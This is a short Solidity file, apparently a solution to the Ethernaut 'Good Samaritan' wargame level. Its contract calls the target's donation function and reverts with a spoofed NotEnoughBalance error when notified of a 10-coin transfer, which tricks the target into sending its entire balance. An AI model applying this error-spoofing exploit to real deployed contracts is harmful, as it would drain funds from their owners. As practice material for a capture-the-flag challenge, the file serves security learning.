// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;



interface GoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

interface Coin {
    function transfer(address x, uint256 y) external returns(bool);
}

contract Sama {
    error NotEnoughBalance();
    function notify(uint256 amount) external {
       if (amount == 10) revert NotEnoughBalance();
    }

    function beg(address ct) public {
        GoodSamaritan(ct).requestDonation();


    }
}
